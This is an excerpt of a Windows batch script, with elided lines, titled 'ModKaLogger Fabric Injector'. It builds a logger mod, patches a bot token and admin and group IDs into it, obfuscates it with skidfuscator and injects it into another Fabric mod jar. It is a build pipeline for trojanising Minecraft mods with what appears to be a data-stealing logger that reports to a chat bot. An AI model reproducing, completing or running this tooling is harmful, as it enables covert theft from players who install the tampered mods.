...
set "MOD_JAR=modkalogger-fabric-1.0.0.jar"
...
echo ============================================
echo   ModKaLogger Fabric Injector v4.3
echo ============================================
if "%GROUP_ID%"=="" (
    echo [i] group_id not provided - sending to personal copy only
)
echo Input:  %INPUT%
echo Output: %OUTPUT%
echo.
...
if not exist "%MOD_JAR%" (
    echo [!] %MOD_JAR% not found, building...
    pushd "%~dp0"
    set "JAVA_HOME=C:\Program Files\Java\jdk-21"
...
echo [OK] Using %MOD_JAR%
echo.

echo [2/5] Injecting token/admin/group into CoreBootstrap...
"%JAVA_HOME%\bin\javac" -encoding UTF-8 -cp "%JAVASSIST_JAR%" TokenPatcher.java 2>nul
"%JAVA_HOME%\bin\java" -cp ".;%JAVASSIST_JAR%" TokenPatcher "%MOD_JAR%" "%BOT_TOKEN%" "%ADMIN_ID%" "%GROUP_ID%" "%MOD_JAR%.patched"
if errorlevel 1 (
...
del /q "%OBF_JAR%" 2>nul
"C:\Program Files\Java\jdk1.8.0_202\bin\java" -Xmx4G -jar skidfuscator.jar obfuscate -cfg config.hocon -rt "%RT_JAR%" -li "%LIBS_DIR%" -o "%OBF_JAR%" "%MOD_JAR%"
if exist "%OBF_JAR%" (
    echo [OK] Obfuscated
) else (
...
"%JAVA_HOME%\bin\javac" -encoding UTF-8 -cp "%JAVASSIST_JAR%" FabricInjector.java MixinFixer.java 2>nul
echo.

echo [5/5] Injecting mod into %INPUT%...
"%JAVA_HOME%\bin\java" -cp ".;%JAVASSIST_JAR%" FabricInjector "%INPUT%" "%OUTPUT%" "%OBF_JAR%"
if errorlevel 1 (
    echo [ERROR] Injection failed
    goto fail
)

"%JAVA_HOME%\bin\java" -cp ".;%JAVASSIST_JAR%" MixinFixer "%OUTPUT%"
echo.
echo [+] DONE: %OUTPUT%
